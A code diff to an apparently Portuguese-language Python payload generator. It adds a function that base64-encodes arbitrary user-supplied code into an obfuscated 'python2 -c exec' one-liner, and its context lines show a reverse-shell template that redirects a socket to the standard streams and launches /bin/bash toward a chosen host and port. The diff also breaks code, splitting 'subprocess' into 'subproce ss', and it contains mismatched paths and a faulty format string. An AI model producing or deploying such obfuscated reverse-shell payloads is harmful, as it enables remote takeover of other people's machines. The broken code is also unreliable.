@@ -4,6 +4,37 @@ import os
 
 
 def payloads():
+    def custon_payload():
+        try:
+            os.makedirs("../../../..payloads/custon")
+            print("[criando pasta Payloads][OK]")
+
+        except OSError as exc:
+            if exc.errno != errno.EEXIST:
+                raise
+            print("[pass]=[pasta payload existente]")
+            pass
+        print("[+]gera custon payload[+]")
+        nome = input("[+]nome=>")
+        prg = input("[+]extencao=>")
+        print("[escreva o seu  custon payload]")
+        code = input(""" """)
+        with open(nome, "w") as pay:
+            dsa = base64.b64encode(bytes(code, 'utf-8'))
+            payload_base64 = (str(dsa)[2:-1])
+            pay.write('python2 -c "exec(' + "'" + payload_base64 + "'.decode('base64'))" + '"')
+            pay.close()
+            if os.path.exists("../../../../payloads/custon/%s" + "." + "%s" % (nome, prg)) == True:
+                print("../../../../payloads/custon/%s" + "." + "%s" % (nome, prg))
+
+
+
+
+
+
+
+
+
     def python():
         try:
             os.makedirs("../../../payloads/")
@@ -24,7 +55,7 @@ def payloads():
     os.dup2(s.fileno(), 0)
     os.dup2(s.fileno(), 1)
     os.dup2(s.fileno(), 2)
-    p = subprocess.call("/bin/bash")
+    p = subproce ss.call("/bin/bash")
             """ % (host, port))
             dsa = base64.b64encode(bytes(payload, 'utf-8'))
             payload_base64 = (str(dsa)[2:-1])
@@ -38,6 +69,7 @@ def payloads():
     check = input("=>")
     if check == "1":
         python()
+
         if check == "1":
             with open("../../../payloads/python_Base64.py") as pay:
                 check = input("[+]base64=1\n[+]decode=2\n=>")
@@ -49,3 +81,5 @@ def payloads():
                     pass
         else:
             pass
+    if check == "2":
+        custon_payload()
